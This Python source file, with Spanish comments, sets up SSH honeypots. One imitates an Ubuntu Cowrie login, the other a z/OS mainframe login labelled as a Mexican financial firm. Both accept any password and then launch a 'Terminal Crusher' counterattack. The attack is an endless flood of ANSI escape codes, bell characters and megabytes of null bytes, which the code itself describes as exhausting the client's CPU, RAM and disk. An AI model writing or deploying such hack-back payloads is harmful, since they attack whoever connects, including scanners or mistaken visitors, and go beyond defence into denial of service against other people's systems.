import time
import os
import random

def terminal_crusher(client_socket):
    """
    Motor de agotamiento agresivo para terminales SSH.
    Utiliza secuencias ANSI para saturar CPU/RAM y nulos para llenar disco.
    """
    print("[⚔️] Mesh-Intel: Iniciando Terminal Crusher (CPU/RAM/Disk Exhaustion).")
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            # Mezclamos comandos ANSI con 1MB de nulos para llenar el disco si loguean
            payload = ansi_bomb
            for _ in range(15): # Mayor densidad de colores
                color = os.urandom(1)[0]
                payload += f"\x1b[48;5;{color}m".encode() + b"\x00" * 150000 + b"\a"
            
            client_socket.send(payload)
            time.sleep(0.04) # Más rápido para mayor impacto
    except: pass

def handle_cowrie_trap(client_socket, ip):
    """Simula un entorno Cowrie (Ubuntu) altamente realista para el puerto 22"""
    try:
        # Banner de Ubuntu real
        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
        client_socket.send(banner)
        
        # Simulación de Login
        client_socket.send(f"hell-node-01 login: ".encode())
        user = client_socket.recv(1024).decode().strip()
        client_socket.send(b"Password: ")
        # No importa qué pongan, entran.
        client_socket.recv(1024)
        
        # Mensaje de bienvenida de Linux
        welcome = (
            f"\r\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n"
            f" * Documentation:  https://help.ubuntu.com\r\n"
            f" * Management:     https://landscape.canonical.com\r\n"
            f" * Support:        https://ubuntu.com/advantage\r\n\r\n"
            f"System information as of {time.strftime('%a %b %d %H:%M:%S')} UTC 2026\r\n\r\n"
            f"  System load:  0.08               Processes:           112\r\n"
            f"  Usage of /:   12.4% of 19.56GB   Users logged in:     1\r\n"
            f"  Memory usage: 14%                IP address for eth0: {ip}\r\n\r\n"
            f"Last login: {time.strftime('%a %b %d %H:%M:%S')} 2026 from 192.168.1.5\r\n"
            f"root@hell-node-01:~# "
        ).encode()
        client_socket.send(welcome)

        # Esperar a que el atacante escriba su primer comando (ls, cd, whoami)
        cmd = client_socket.recv(1024).decode().strip()
        print(f"[😈] Atacante ejecutó '{cmd}' en la trampa Cowrie. Lanzando Crusher.")
        
        # El contraataque: El sistema "falla" y lanza el volcado de memoria (ANSI)
        client_socket.send(b"\r\n-bash: critical memory corruption detected. Dumping core...\r\n")
        terminal_crusher(client_socket)
    except: pass

def handle_mainframe_shell(client_socket, ip):
    """Mantiene la simulación de Monex para el puerto 2222"""
    try:
        client_socket.send(b"ICH70001I - LOGIN TO IBM z/OS v2.5 AT MONEX-FINANCIAL-MEX\r\nENTER USERID - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ENTER PASSWORD - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ICH70008I LOGIN SUCCESSFUL. SYSTEM: MONEX-MX-COBOL-V8\r\nREADY\r\n")
        time.sleep(15)
        client_socket.send(b"\r\n*** CRITICAL SYSTEM OVERLOAD - INITIATING MEMORY DUMP ***\r\n")
        terminal_crusher(client_socket)
    except: pass
